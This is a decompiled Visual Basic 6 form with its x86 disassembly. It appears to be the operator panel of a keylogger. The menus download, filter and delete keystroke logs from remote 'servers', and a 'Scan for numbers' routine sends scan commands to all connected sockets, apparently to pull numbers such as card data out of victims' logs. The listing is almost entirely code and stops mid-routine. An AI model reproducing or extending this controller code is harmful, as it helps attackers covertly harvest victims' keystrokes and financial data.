VERSION 5.00
Begin VB.Form frmPanel
  Caption = "Keylogger"
  ScaleMode = 1
  AutoRedraw = False
  FontTransparent = True
  Icon = "frmPanel.frx":0
  LinkTopic = "Form1"
  ClientLeft = 165
  ClientTop = 255
  ClientWidth = 11580
  ClientHeight = 4065
  StartUpPosition = 2 'CenterScreen
  Begin MSComctlLib.StatusBar sbStatus
    Left = 0
    Top = 3750
    Width = 11580
    Height = 315
    TabIndex = 0
  End
  Begin MSComctlLib.ListView lstKeylogging
    Left = 0
    Top = 0
    Width = 11535
    Height = 3735
    TabIndex = 1
  End
  Begin VB.Menu mnuKeyloggningMeny
    Visible = 0   'False
    Caption = "Keyloggning"
    Begin VB.Menu mnuKeyloggning
      Index = 0
      Caption = "Get entire log"
      Begin VB.Menu mnuHelLoggNuvarande
        Caption = "From current server"
      End
      Begin VB.Menu mnuHelLoggAlla
        Caption = "From all servers"
      End
      Begin VB.Menu mnuHelLoggMarkerade
        Caption = "From selected servers"
      End
      Begin VB.Menu mnuScanAll
        Caption = "Scan for numbers"
      End
    End
    Begin VB.Menu mnuKeyloggning
      Index = 1
      Caption = "Filter keylog download"
      Begin VB.Menu mnuFiltreradLoggNuvarande
        Caption = "From current server"
      End
      Begin VB.Menu mnuFiltreradLoggAlla
        Caption = "From all servers"
      End
      Begin VB.Menu mnuFiltreradLoggMarkerade
        Caption = "From selected servers"
      End
    End
    Begin VB.Menu mnuKeyloggning
      Index = 2
      Caption = "-"
    End
    Begin VB.Menu mnuKeyloggning
      Index = 3
      Caption = "Delete log"
      Begin VB.Menu mnuRensaLoggAlla
        Caption = "All servers"
      End
      Begin VB.Menu mnuRaderaLoggMarkerade
        Caption = "Selected servers"
      End
    End
    Begin VB.Menu mnuKeyloggning
      Index = 4
      Caption = "-"
    End
    Begin VB.Menu mnuKeyloggning
      Index = 5
      Caption = "Clean list"
    End
  End
End

Attribute VB_Name = "frmPanel"


Private sub Form__7476FC
007476FC: push ebp
007476FD: mov ebp, esp
007476FF: sub esp, 00000018h
00747702: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
00747707: mov eax, fs:[00h]
0074770D: push eax
0074770E: mov fs:[00000000h], esp
00747715: mov eax, 000000B0h
0074771A: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0074771F: push ebx
00747720: push esi
00747721: push edi
00747722: mov var_18, esp
00747725: mov var_14, 00405978h
0074772C: mov eax, [ebp+08h]
0074772F: and eax, 00000001h
00747732: mov var_10, eax
00747735: mov eax, [ebp+08h]
00747738: and al, FEh
0074773A: mov [ebp+08h], eax
0074773D: mov var_0C, 00000000h
00747744: mov eax, [ebp+08h]
00747747: mov eax, [eax]
00747749: push [ebp+08h]
0074774C: call [eax+04h]
0074774F: mov var_04, 00000001h
00747756: mov var_04, 00000002h
0074775D: push FFFFFFFFh
0074775F: call 00410A60h ; On Error ...
00747764: mov var_04, 00000003h
0074776B: fldz 
0074776D: fstp real4 ptr var_2C
00747770: mov var_34, 00000004h
00747777: and var_4C, 00000000h
0074777B: mov var_54, 00000002h
00747782: lea eax, var_000000A8
00747788: push eax
00747789: mov eax, [ebp+08h]
0074778C: mov eax, [eax]
0074778E: push [ebp+08h]
00747791: call [eax+00000080h]
00747797: fclex 
00747799: mov var_000000B0, eax
0074779F: cmp var_000000B0, 00000000h
007477A6: jnl 7477C8h
007477A8: push 00000080h
007477AD: push 00444B74h
007477B2: push [ebp+08h]
007477B5: push var_000000B0
007477BB: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
007477C0: mov var_000000CC, eax
007477C6: jmp 7477CFh
007477C8: and var_000000CC, 00000000h
007477CF: fld real4 ptr var_000000A8
007477D5: fsub real4 ptr [00402B44h]
007477DB: fstp real4 ptr var_6C
007477DE: fstsw ax
007477E0: test al, 0Dh
007477E2: jnz 00747911h
007477E8: mov var_74, 00000004h
007477EF: lea eax, var_000000AC
007477F5: push eax
007477F6: mov eax, [ebp+08h]
007477F9: mov eax, [eax]
007477FB: push [ebp+08h]
007477FE: call [eax+00000088h]
00747804: fclex 
00747806: mov var_000000B4, eax
0074780C: cmp var_000000B4, 00000000h
00747813: jnl 747835h
00747815: push 00000088h
0074781A: push 00444B74h
0074781F: push [ebp+08h]
00747822: push var_000000B4
00747828: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0074782D: mov var_000000D0, eax
00747833: jmp 74783Ch
00747835: and var_000000D0, 00000000h
0074783C: fld real4 ptr var_000000AC
00747842: fsub real4 ptr [00402B7Ch]
00747848: fstp real4 ptr var_0000008C
0074784E: fstsw ax
00747850: test al, 0Dh
00747852: jnz 00747911h
00747858: mov var_00000094, 00000004h
00747862: push 00000010h
00747864: pop eax
00747865: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0074786A: lea esi, var_34
0074786D: mov edi, esp
0074786F: movsd 
00747870: movsd 
00747871: movsd 
00747872: movsd 
00747873: push 00000010h
00747875: pop eax
00747876: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0074787B: lea esi, var_54
0074787E: mov edi, esp
00747880: movsd 
00747881: movsd 
00747882: movsd 
00747883: movsd 
00747884: push 00000010h
00747886: pop eax
00747887: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0074788C: lea esi, var_74
0074788F: mov edi, esp
00747891: movsd 
00747892: movsd 
00747893: movsd 
00747894: movsd 
00747895: push 00000010h
00747897: pop eax
00747898: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0074789D: lea esi, var_00000094
007478A3: mov edi, esp
007478A5: movsd 
007478A6: movsd 
007478A7: movsd 
007478A8: movsd 
007478A9: push 00000004h
007478AB: push 80011002h
007478B0: mov eax, [ebp+08h]
007478B3: mov eax, [eax]
007478B5: push [ebp+08h]
007478B8: call [eax+0000032Ch]
007478BE: push eax
007478BF: lea eax, var_24
007478C2: push eax
007478C3: call 00410A84h ; Set (object)
007478C8: push eax
007478C9: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
007478CE: add esp, 0000004Ch
007478D1: lea ecx, var_24
007478D4: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
007478D9: mov var_10, 00000000h
007478E0: wait 
007478E1: push 007478F2h
007478E6: jmp 7478F1h
007478E8: lea ecx, var_24
007478EB: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
007478F0: ret 
End Sub

Private sub mnuScanAll__74E856
0074E856: push ebp
0074E857: mov ebp, esp
0074E859: sub esp, 00000018h
0074E85C: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
0074E861: mov eax, fs:[00h]
0074E867: push eax
0074E868: mov fs:[00000000h], esp
0074E86F: mov eax, 000001B0h
0074E874: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0074E879: push ebx
0074E87A: push esi
0074E87B: push edi
0074E87C: mov var_18, esp
0074E87F: mov var_14, 00405E00h
0074E886: mov eax, [ebp+08h]
0074E889: and eax, 00000001h
0074E88C: mov var_10, eax
0074E88F: mov eax, [ebp+08h]
0074E892: and al, FEh
0074E894: mov [ebp+08h], eax
0074E897: mov var_0C, 00000000h
0074E89E: mov eax, [ebp+08h]
0074E8A1: mov eax, [eax]
0074E8A3: push [ebp+08h]
0074E8A6: call [eax+04h]
0074E8A9: mov var_04, 00000001h
0074E8B0: mov var_04, 00000002h
0074E8B7: push FFFFFFFFh
0074E8B9: call 00410A60h ; On Error ...
0074E8BE: mov var_04, 00000003h
0074E8C5: mov var_000000C4, 80020004h
0074E8CF: mov var_000000CC, 0000000Ah
0074E8D9: mov var_000000B4, 80020004h
0074E8E3: mov var_000000BC, 0000000Ah
0074E8ED: mov var_000000A4, 80020004h
0074E8F7: mov var_000000AC, 0000000Ah
0074E901: mov var_00000094, 80020004h
0074E90B: mov var_0000009C, 0000000Ah
0074E915: mov var_00000084, 80020004h
0074E91F: mov var_0000008C, 0000000Ah
0074E929: mov var_000000E8, 0044BD44h ; Scan for numbers
0074E933: mov var_000000F0, 00000008h
0074E93D: lea edx, var_000000F0
0074E943: lea ecx, var_7C
0074E946: call 004109E2h ; msvbvm60.dll.__vbaVarDup
0074E94B: mov var_000000D8, 0044BD10h ; Total numbers to scan:
0074E955: mov var_000000E0, 00000008h
0074E95F: lea edx, var_000000E0
0074E965: lea ecx, var_6C
0074E968: call 004109E2h ; msvbvm60.dll.__vbaVarDup
0074E96D: lea eax, var_000000CC
0074E973: push eax
0074E974: lea eax, var_000000BC
0074E97A: push eax
0074E97B: lea eax, var_000000AC
0074E981: push eax
0074E982: lea eax, var_0000009C
0074E988: push eax
0074E989: lea eax, var_0000008C
0074E98F: push eax
0074E990: lea eax, var_7C
0074E993: push eax
0074E994: lea eax, var_6C
0074E997: push eax
0074E998: call 00410994h ; InputBox
0074E99D: mov edx, eax
0074E99F: lea ecx, var_3C
0074E9A2: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0074E9A7: push eax
0074E9A8: call 004109DCh ; Val(arg_1)
0074E9AD: call 00410814h ; msvbvm60.dll.__vbaFpI4
0074E9B2: mov var_38, eax
0074E9B5: lea ecx, var_3C
0074E9B8: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
0074E9BD: lea eax, var_000000CC
0074E9C3: push eax
0074E9C4: lea eax, var_000000BC
0074E9CA: push eax
0074E9CB: lea eax, var_000000AC
0074E9D1: push eax
0074E9D2: lea eax, var_0000009C
0074E9D8: push eax
0074E9D9: lea eax, var_0000008C
0074E9DF: push eax
0074E9E0: lea eax, var_7C
0074E9E3: push eax
0074E9E4: lea eax, var_6C
0074E9E7: push eax
0074E9E8: push 00000007h
0074E9EA: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0074E9EF: add esp, 00000020h
0074E9F2: mov var_04, 00000004h
0074E9F9: mov var_000000C4, 80020004h
0074EA03: mov var_000000CC, 0000000Ah
0074EA0D: mov var_000000B4, 80020004h
0074EA17: mov var_000000BC, 0000000Ah
0074EA21: mov var_000000A4, 80020004h
0074EA2B: mov var_000000AC, 0000000Ah
0074EA35: mov var_00000094, 80020004h
0074EA3F: mov var_0000009C, 0000000Ah
0074EA49: mov var_00000084, 80020004h
0074EA53: mov var_0000008C, 0000000Ah
0074EA5D: mov var_000000E8, 0044BA4Ch ; Filtered keylog
0074EA67: mov var_000000F0, 00000008h
0074EA71: lea edx, var_000000F0
0074EA77: lea ecx, var_7C
0074EA7A: call 004109E2h ; msvbvm60.dll.__vbaVarDup
0074EA7F: mov var_000000D8, 0044BA70h ; Total number of charactes to include after the keyword
0074EA89: mov var_000000E0, 00000008h
0074EA93: lea edx, var_000000E0
0074EA99: lea ecx, var_6C
0074EA9C: call 004109E2h ; msvbvm60.dll.__vbaVarDup
0074EAA1: lea eax, var_000000CC
0074EAA7: push eax
0074EAA8: lea eax, var_000000BC
0074EAAE: push eax
0074EAAF: lea eax, var_000000AC
0074EAB5: push eax
0074EAB6: lea eax, var_0000009C
0074EABC: push eax
0074EABD: lea eax, var_0000008C
0074EAC3: push eax
0074EAC4: lea eax, var_7C
0074EAC7: push eax
0074EAC8: lea eax, var_6C
0074EACB: push eax
0074EACC: call 00410994h ; InputBox
0074EAD1: mov edx, eax
0074EAD3: lea ecx, var_3C
0074EAD6: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0074EADB: push eax
0074EADC: call 004109DCh ; Val(arg_1)
0074EAE1: call 00410814h ; msvbvm60.dll.__vbaFpI4
0074EAE6: mov var_34, eax
0074EAE9: lea ecx, var_3C
0074EAEC: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
0074EAF1: lea eax, var_000000CC
0074EAF7: push eax
0074EAF8: lea eax, var_000000BC
0074EAFE: push eax
0074EAFF: lea eax, var_000000AC
0074EB05: push eax
0074EB06: lea eax, var_0000009C
0074EB0C: push eax
0074EB0D: lea eax, var_0000008C
0074EB13: push eax
0074EB14: lea eax, var_7C
0074EB17: push eax
0074EB18: lea eax, var_6C
0074EB1B: push eax
0074EB1C: push 00000007h
0074EB1E: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0074EB23: add esp, 00000020h
0074EB26: mov var_04, 00000005h
0074EB2D: cmp var_38, 00000000h
0074EB31: jnle 74EB38h
0074EB33: jmp 0074F238h
0074EB38: mov var_04, 00000008h
0074EB3F: cmp var_34, 00000000h
0074EB43: jnle 74EB4Ah
0074EB45: jmp 0074F238h
0074EB4A: mov var_04, 0000000Bh
0074EB51: push 0044BD6Ch ; Scan(
0074EB56: push var_38
0074EB59: call 00410A1Eh ; msvbvm60.dll.__vbaStrI4
0074EB5E: mov edx, eax
0074EB60: lea ecx, var_3C
0074EB63: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0074EB68: push eax
0074EB69: call 004109DCh ; Val(arg_1)
0074EB6E: push ecx
0074EB6F: push ecx
0074EB70: fstp real8 ptr [esp]
0074EB73: call 00410790h ; msvbvm60.dll.__vbaStrR8
0074EB78: mov edx, eax
0074EB7A: lea ecx, var_40
0074EB7D: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0074EB82: push eax
0074EB83: call 00410A18h ; &
0074EB88: mov edx, eax
0074EB8A: lea ecx, var_44
0074EB8D: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0074EB92: push eax
0074EB93: push 0044BD7Ch
0074EB98: call 00410A18h ; &
0074EB9D: mov edx, eax
0074EB9F: mov ecx, 008F23B4h
0074EBA4: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0074EBA9: lea eax, var_44
0074EBAC: push eax
0074EBAD: lea eax, var_40
0074EBB0: push eax
0074EBB1: lea eax, var_3C
0074EBB4: push eax
0074EBB5: push 00000003h
0074EBB7: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
0074EBBC: add esp, 00000010h
0074EBBF: mov var_04, 0000000Ch
0074EBC6: and [008F23B8h], 00000000h
0074EBCD: mov var_04, 0000000Dh
0074EBD4: fldz 
0074EBD6: fstp real8 ptr [008F23BCh]
0074EBDC: mov var_04, 0000000Eh
0074EBE3: fldz 
0074EBE5: fstp real8 ptr [008F23ACh]
0074EBEB: mov var_04, 00000010h
0074EBF2: mov var_000000D8, 00000001h
0074EBFC: mov var_000000E0, 00000002h
0074EC06: push 004412BCh
0074EC0B: push 00000000h
0074EC0D: push 00000007h
0074EC0F: mov eax, [ebp+08h]
0074EC12: mov eax, [eax]
0074EC14: push [ebp+08h]
0074EC17: call [eax+0000032Ch]
0074EC1D: push eax
0074EC1E: lea eax, var_54
0074EC21: push eax
0074EC22: call 00410A84h ; Set (object)
0074EC27: push eax
0074EC28: lea eax, var_6C
0074EC2B: push eax
0074EC2C: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0074EC31: add esp, 00000010h
0074EC34: push eax
0074EC35: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0074EC3A: push eax
0074EC3B: lea eax, var_58
0074EC3E: push eax
0074EC3F: call 00410A84h ; Set (object)
0074EC44: mov var_0000014C, eax
0074EC4A: lea eax, var_00000148
0074EC50: push eax
0074EC51: mov eax, var_0000014C
0074EC57: mov eax, [eax]
0074EC59: push var_0000014C
0074EC5F: call [eax+1Ch]
0074EC62: fclex 
0074EC64: mov var_00000150, eax
0074EC6A: cmp var_00000150, 00000000h
0074EC71: jnl 74EC93h
0074EC73: push 0000001Ch
0074EC75: push 004412BCh
0074EC7A: push var_0000014C
0074EC80: push var_00000150
0074EC86: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0074EC8B: mov var_000001BC, eax
0074EC91: jmp 74EC9Ah
0074EC93: and var_000001BC, 00000000h
0074EC9A: mov eax, var_00000148
0074ECA0: mov var_000000E8, eax
0074ECA6: mov var_000000F0, 00000003h
0074ECB0: mov var_000000F8, 00000001h
0074ECBA: mov var_00000100, 00000002h
0074ECC4: lea eax, var_000000E0
0074ECCA: push eax
0074ECCB: lea eax, var_000000F0
0074ECD1: push eax
0074ECD2: lea eax, var_00000100
0074ECD8: push eax
0074ECD9: lea eax, var_0000017C
0074ECDF: push eax
0074ECE0: lea eax, var_0000016C
0074ECE6: push eax
0074ECE7: lea eax, var_30
0074ECEA: push eax
0074ECEB: call 00410A3Ch ; For
0074ECF0: mov var_000001B4, eax
0074ECF6: lea eax, var_58
0074ECF9: push eax
0074ECFA: lea eax, var_54
0074ECFD: push eax
0074ECFE: push 00000002h
0074ED00: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0074ED05: add esp, 0000000Ch
0074ED08: lea ecx, var_6C
0074ED0B: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
0074ED10: jmp 0074EF4Fh
0074ED15: mov var_04, 00000011h
0074ED1C: push 004412BCh
0074ED21: push 00000000h
0074ED23: push 00000007h
0074ED25: mov eax, [ebp+08h]
0074ED28: mov eax, [eax]
0074ED2A: push [ebp+08h]
0074ED2D: call [eax+0000032Ch]
0074ED33: push eax
0074ED34: lea eax, var_54
0074ED37: push eax
0074ED38: call 00410A84h ; Set (object)
0074ED3D: push eax
0074ED3E: lea eax, var_6C
0074ED41: push eax
0074ED42: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0074ED47: add esp, 00000010h
0074ED4A: push eax
0074ED4B: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0074ED50: push eax
0074ED51: lea eax, var_58
0074ED54: push eax
0074ED55: call 00410A84h ; Set (object)
0074ED5A: mov var_0000014C, eax
0074ED60: lea eax, var_5C
0074ED63: push eax
0074ED64: lea eax, var_30
0074ED67: push eax
0074ED68: mov eax, var_0000014C
0074ED6E: mov eax, [eax]
0074ED70: push var_0000014C
0074ED76: call [eax+24h]
0074ED79: fclex 
0074ED7B: mov var_00000150, eax
0074ED81: cmp var_00000150, 00000000h
0074ED88: jnl 74EDAAh
0074ED8A: push 00000024h
0074ED8C: push 004412BCh
0074ED91: push var_0000014C
0074ED97: push var_00000150
0074ED9D: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0074EDA2: mov var_000001C0, eax
0074EDA8: jmp 74EDB1h
0074EDAA: and var_000001C0, 00000000h
0074EDB1: mov eax, var_5C
0074EDB4: mov var_00000154, eax
0074EDBA: lea eax, var_3C
0074EDBD: push eax
0074EDBE: push 00000005h
0074EDC0: mov eax, var_00000154
0074EDC6: mov eax, [eax]
0074EDC8: push var_00000154
0074EDCE: call [eax+00000084h]
0074EDD4: fclex 
0074EDD6: mov var_00000158, eax
0074EDDC: cmp var_00000158, 00000000h
0074EDE3: jnl 74EE08h
0074EDE5: push 00000084h
0074EDEA: push 004412DCh
0074EDEF: push var_00000154
0074EDF5: push var_00000158
0074EDFB: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0074EE00: mov var_000001C4, eax
0074EE06: jmp 74EE0Fh
0074EE08: and var_000001C4, 00000000h
0074EE0F: push var_3C
0074EE12: push 0044BAE4h ; 100%
0074EE17: call 00410A00h ; msvbvm60.dll.__vbaStrCmp
0074EE1C: neg eax
0074EE1E: sbb eax, eax
0074EE20: inc eax
0074EE21: neg eax
0074EE23: mov var_0000015C, ax
0074EE2A: lea ecx, var_3C
0074EE2D: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
0074EE32: lea eax, var_5C
0074EE35: push eax
0074EE36: lea eax, var_58
0074EE39: push eax
0074EE3A: lea eax, var_54
0074EE3D: push eax
0074EE3E: push 00000003h
0074EE40: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0074EE45: add esp, 00000010h
0074EE48: lea ecx, var_6C
0074EE4B: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
0074EE50: movsx eax, word ptr var_0000015C
0074EE57: test eax, eax
0074EE59: jz 0074EF2Bh
0074EE5F: mov var_04, 00000012h
0074EE66: push 004412BCh
0074EE6B: push 00000000h
0074EE6D: push 00000007h
0074EE6F: mov eax, [ebp+08h]
0074EE72: mov eax, [eax]
0074EE74: push [ebp+08h]
0074EE77: call [eax+0000032Ch]
0074EE7D: push eax
0074EE7E: lea eax, var_54
0074EE81: push eax
0074EE82: call 00410A84h ; Set (object)
0074EE87: push eax
0074EE88: lea eax, var_6C
0074EE8B: push eax
0074EE8C: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0074EE91: add esp, 00000010h
0074EE94: push eax
0074EE95: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0074EE9A: push eax
0074EE9B: lea eax, var_58
0074EE9E: push eax
0074EE9F: call 00410A84h ; Set (object)
0074EEA4: mov var_0000014C, eax
0074EEAA: lea edx, var_30
0074EEAD: lea ecx, var_7C
0074EEB0: call 004108F2h ; msvbvm60.dll.__vbaVarCopy
0074EEB5: lea eax, var_7C
0074EEB8: push eax
0074EEB9: mov eax, var_0000014C
0074EEBF: mov eax, [eax]
0074EEC1: push var_0000014C
0074EEC7: call [eax+34h]
0074EECA: fclex 
0074EECC: mov var_00000150, eax
0074EED2: cmp var_00000150, 00000000h
0074EED9: jnl 74EEFBh
0074EEDB: push 00000034h
0074EEDD: push 004412BCh
0074EEE2: push var_0000014C
0074EEE8: push var_00000150
0074EEEE: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0074EEF3: mov var_000001C8, eax
0074EEF9: jmp 74EF02h
0074EEFB: and var_000001C8, 00000000h
0074EF02: lea eax, var_58
0074EF05: push eax
0074EF06: lea eax, var_54
0074EF09: push eax
0074EF0A: push 00000002h
0074EF0C: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0074EF11: add esp, 0000000Ch
0074EF14: lea eax, var_7C
0074EF17: push eax
0074EF18: lea eax, var_6C
0074EF1B: push eax
0074EF1C: push 00000002h
0074EF1E: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0074EF23: add esp, 0000000Ch
0074EF26: jmp 0074EBEBh
0074EF2B: mov var_04, 00000015h
0074EF32: lea eax, var_0000017C
0074EF38: push eax
0074EF39: lea eax, var_0000016C
0074EF3F: push eax
0074EF40: lea eax, var_30
0074EF43: push eax
0074EF44: call 00410A36h ; Next
0074EF49: mov var_000001B4, eax
0074EF4F: cmp var_000001B4, 00000000h
0074EF56: jnz 0074ED15h
0074EF5C: mov var_04, 00000016h
0074EF63: push 00FF00FFh
0074EF68: push 0044B908h ; Scan for numbers (
0074EF6D: push var_38
0074EF70: call 00410A1Eh ; msvbvm60.dll.__vbaStrI4
0074EF75: mov edx, eax
0074EF77: lea ecx, var_3C
0074EF7A: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0074EF7F: push eax
0074EF80: call 00410A18h ; &
0074EF85: mov edx, eax
0074EF87: lea ecx, var_40
0074EF8A: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0074EF8F: push eax
0074EF90: push 004496A8h
0074EF95: call 00410A18h ; &
0074EF9A: mov edx, eax
0074EF9C: lea ecx, var_44
0074EF9F: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0074EFA4: push eax
0074EFA5: push var_34
0074EFA8: call 00410A1Eh ; msvbvm60.dll.__vbaStrI4
0074EFAD: mov edx, eax
0074EFAF: lea ecx, var_48
0074EFB2: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0074EFB7: push eax
0074EFB8: call 00410A18h ; &
0074EFBD: mov edx, eax
0074EFBF: lea ecx, var_4C
0074EFC2: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0074EFC7: push eax
0074EFC8: push 0044BB98h ; ) - All sockets
0074EFCD: call 00410A18h ; &
0074EFD2: mov edx, eax
0074EFD4: lea ecx, var_50
0074EFD7: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0074EFDC: push eax
0074EFDD: push 00442864h ; Keylog
0074EFE2: push 00443C28h
0074EFE7: call 0074FC42h
0074EFEC: lea eax, var_50
0074EFEF: push eax
0074EFF0: lea eax, var_4C
0074EFF3: push eax
0074EFF4: lea eax, var_48
0074EFF7: push eax
0074EFF8: lea eax, var_44
0074EFFB: push eax
0074EFFC: lea eax, var_40
0074EFFF: push eax
0074F000: lea eax, var_3C
0074F003: push eax
0074F004: push 00000006h
0074F006: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
0074F00B: add esp, 0000001Ch
0074F00E: mov var_04, 00000017h
0074F015: mov var_000000D8, 00000001h
0074F01F: mov var_000000E0, 00000002h
0074F029: cmp [008F2010h], 00000000h
0074F030: jnz 74F04Dh
0074F032: push 008F2010h
0074F037: push 00433984h
0074F03C: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
0074F041: mov var_000001CC, 008F2010h
0074F04B: jmp 74F057h
0074F04D: mov var_000001CC, 008F2010h
0074F057: mov eax, var_000001CC
0074F05D: mov eax, [eax]
0074F05F: mov ecx, var_000001CC
0074F065: mov ecx, [ecx]
0074F067: mov ecx, [ecx]
0074F069: push eax
0074F06A: call [ecx+00000524h]
0074F070: push eax
0074F071: lea eax, var_54
0074F074: push eax
0074F075: call 00410A84h ; Set (object)
0074F07A: mov var_0000014C, eax
0074F080: lea eax, var_00000144
0074F086: push eax
0074F087: mov eax, var_0000014C
0074F08D: mov eax, [eax]
0074F08F: push var_0000014C
0074F095: call [eax+48h]
0074F098: fclex 
0074F09A: mov var_00000150, eax
0074F0A0: cmp var_00000150, 00000000h
0074F0A7: jnl 74F0C9h
0074F0A9: push 00000048h
0074F0AB: push 00440DE8h
0074F0B0: push var_0000014C
0074F0B6: push var_00000150
0074F0BC: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0074F0C1: mov var_000001D0, eax
0074F0C7: jmp 74F0D0h
0074F0C9: and var_000001D0, 00000000h
0074F0D0: mov ax, var_00000144
0074F0D7: mov var_000000E8, ax
0074F0DE: mov var_000000F0, 00000002h
0074F0E8: mov var_000000F8, 00000001h
0074F0F2: mov var_00000100, 00000002h
0074F0FC: lea eax, var_000000E0
0074F102: push eax
0074F103: lea eax, var_000000F0
0074F109: push eax
0074F10A: lea eax, var_00000100
0074F110: push eax
0074F111: lea eax, var_0000019C
0074F117: push eax
0074F118: lea eax, var_0000018C
0074F11E: push eax
0074F11F: lea eax, var_30
0074F122: push eax
0074F123: call 00410A3Ch ; For
0074F128: mov var_000001B8, eax
0074F12E: lea ecx, var_54
0074F131: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0074F136: jmp 0074F22Bh
0074F13B: mov var_04, 00000018h
0074F142: push 00000000h
0074F144: push 00000001h
0074F146: push 00000001h
0074F148: push 00000000h
0074F14A: lea eax, var_000000D0
0074F150: push eax
0074F151: push 00000010h
0074F153: push 00000880h
0074F158: call 00410946h ; ReDim
0074F15D: add esp, 0000001Ch
0074F160: lea eax, var_38
0074F163: mov var_000000D8, eax
0074F169: mov var_000000E0, 00004003h
0074F173: lea esi, var_000000E0
0074F179: push 00000000h
0074F17B: push var_000000D0
0074F181: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
0074F186: mov ecx, eax
0074F188: mov edx, esi
0074F18A: call 00410940h ; msvbvm60.dll.__vbaVarZero
0074F18F: lea eax, var_34
0074F192: mov var_000000E8, eax
0074F198: mov var_000000F0, 00004003h
0074F1A2: lea esi, var_000000F0
0074F1A8: push 00000001h
0074F1AA: push var_000000D0
0074F1B0: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
0074F1B5: mov ecx, eax
0074F1B7: mov edx, esi
0074F1B9: call 00410940h ; msvbvm60.dll.__vbaVarZero
0074F1BE: mov edx, 0043D558h ; x27
0074F1C3: lea ecx, var_3C
0074F1C6: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
0074F1CB: lea eax, var_000000D0
0074F1D1: push eax
0074F1D2: lea eax, var_3C
0074F1D5: push eax
0074F1D6: lea eax, var_30
0074F1D9: push eax
0074F1DA: call 004109D0h ; msvbvm60.dll.__vbaI2Var
0074F1DF: push eax
0074F1E0: call 007A6910h
0074F1E5: lea eax, var_000000D0
0074F1EB: push eax
0074F1EC: push 00000000h
0074F1EE: call 00410934h ; Erase
0074F1F3: lea ecx, var_3C
0074F1F6: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
0074F1FB: mov var_04, 00000019h
0074F202: call 0041096Ah ; DoEvents
0074F207: mov var_04, 0000001Ah
0074F20E: lea eax, var_0000019C
0074F214: push eax
0074F215: lea eax, var_0000018C
0074F21B: push eax
0074F21C: lea eax, var_30
0074F21F: push eax
0074F220: call 00410A36h ; Next
0074F225: mov var_000001B8, eax
0074F22B: cmp var_000001B8, 00000000h
0074F232: jnz 0074F13Bh
0074F238: mov var_10, 00000000h
0074F23F: wait 
0074F240: push 0074F2F2h
0074F245: jmp 74F2C3h
0074F247: lea eax, var_50
0074F24A: push eax
0074F24B: lea eax, var_4C
0074F24E: push eax
0074F24F: lea eax, var_48
0074F252: push eax
0074F253: lea eax, var_44
0074F256: push eax
0074F257: lea eax, var_40
0074F25A: push eax
0074F25B: lea eax, var_3C
0074F25E: push eax
0074F25F: push 00000006h
0074F261: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
0074F266: add esp, 0000001Ch
0074F269: lea eax, var_5C
0074F26C: push eax
0074F26D: lea eax, var_58
0074F270: push eax
0074F271: lea eax, var_54
0074F274: push eax
0074F275: push 00000003h
0074F277: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0074F27C: add esp, 00000010h
0074F27F: lea eax, var_000000CC
0074F285: push eax
0074F286: lea eax, var_000000BC
0074F28C: push eax
0074F28D: lea eax, var_000000AC
0074F293: push eax
0074F294: lea eax, var_0000009C
0074F29A: push eax
0074F29B: lea eax, var_0000008C
0074F2A1: push eax
0074F2A2: lea eax, var_7C
0074F2A5: push eax
0074F2A6: lea eax, var_6C
0074F2A9: push eax
0074F2AA: push 00000007h
0074F2AC: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0074F2B1: add esp, 00000020h
0074F2B4: lea eax, var_000000D0
0074F2BA: push eax
